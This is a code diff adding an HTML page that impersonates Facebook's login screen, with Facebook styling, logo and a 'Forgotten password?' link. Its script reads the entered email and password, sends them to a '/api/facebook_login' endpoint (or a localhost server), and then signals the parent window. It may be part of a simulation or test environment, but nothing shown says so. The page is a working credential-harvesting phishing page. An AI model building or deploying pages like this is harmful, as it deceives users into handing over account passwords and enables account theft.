@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Log in to Facebook</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #f0f2f5;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 396px;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1);
+            padding: 24px;
+            text-align: center;
+        }
+
+        .facebook-logo {
+            font-size: 52px;
+            font-weight: 900;
+            color: #1877f2;
+            margin-bottom: 20px;
+            letter-spacing: -4px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #050505;
+            margin-bottom: 24px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 16px 14px;
+            font-size: 17px;
+            color: #050505;
+            background-color: #f0f2f5;
+            border: 1px solid #dddfe2;
+            border-radius: 8px;
+            outline: none;
+            margin-bottom: 12px;
+            transition: all 0.2s;
+        }
+
+        .input-field:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+        }
+
+        .input-field::placeholder {
+            color: #606770;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            margin-top: 8px;
+            background-color: #1877f2;
+            color: #ffffff;
+            font-size: 17px;
+            font-weight: 600;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .login-btn:hover {
+            background-color: #166fe5;
+        }
+
+        .forgotten {
+            text-align: center;
+            margin: 18px 0 20px;
+            font-size: 15px;
+            color: #1877f2;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .forgotten:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <!-- Facebook Logo -->
+        <div class="facebook-logo">f</div>
+        
+        <h1>Log in to Facebook</h1>
+
+        <input class="input-field" type="text" id="email" placeholder="Email address or mobile number" />
+        <input class="input-field" type="password" id="password" placeholder="Password" />
+
+        <button class="login-btn" onclick="login()">Log in</button>
+
+        <a href="#" class="forgotten">Forgotten password?</a>
+    </div>
+
+    <script>
+        async function login() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            if (!email || !password) {
+                alert("Please enter email and password");
+                return;
+            }
+
+            try {
+                const apiHost = window.location.protocol === 'file:' ? 'http://localhost:5001' : '';
+                const endpoint = apiHost + '/api/facebook_login';
+                
+                await fetch(endpoint, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, password })
+                });
+                
+                window.parent.postMessage({ type: 'FACEBOOK_LOGIN_DONE' }, '*');
+            } catch (error) {
+                console.error(error);
+                window.parent.postMessage({ type: 'FACEBOOK_LOGIN_DONE' }, '*');
+            }
+        }
+
+        // Allow Enter key to login
+        document.addEventListener('keypress', function(e) {
+            if (e.key === "Enter") {
+                login();
+            }
+        });
+    </script>
+
+</body>
+</html>
